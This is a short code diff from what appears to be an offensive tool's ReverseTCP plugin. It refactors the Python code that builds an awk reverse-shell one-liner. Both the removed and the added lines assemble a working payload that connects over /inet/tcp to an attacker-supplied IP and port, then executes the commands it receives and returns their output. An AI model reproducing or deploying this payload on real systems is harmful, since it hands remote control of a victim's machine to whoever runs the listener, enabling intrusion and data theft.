@@ -35,6 +35,8 @@ class ReverseTCP(plugin.ReverseShell):
         #     self.shell += """print "{}" >""".format(self.args.filewrite[1])
         #     self.shell += """LFILE }'"""
         # else:
-        self.shell = """awk 'BEGIN {s ="""
-        self.shell += """ "/inet/tcp/0/{}/{}";""".format(self.args.ip, self.args.port).format(self.args.ip, self.args.port)
-        self.shell += """while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null"""
+        self.shell = """awk 'BEGIN {s = \""""
+        self.shell += f"""/inet/tcp/0/{self.args.ip}/{self.args.port}";"""
+        self.shell += """while(42) { do{ printf "shell>" |& s; s |& getline c; """
+        self.shell += """if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } """
+        self.shell += """while(c != "exit") close(s); }}' /dev/null"""
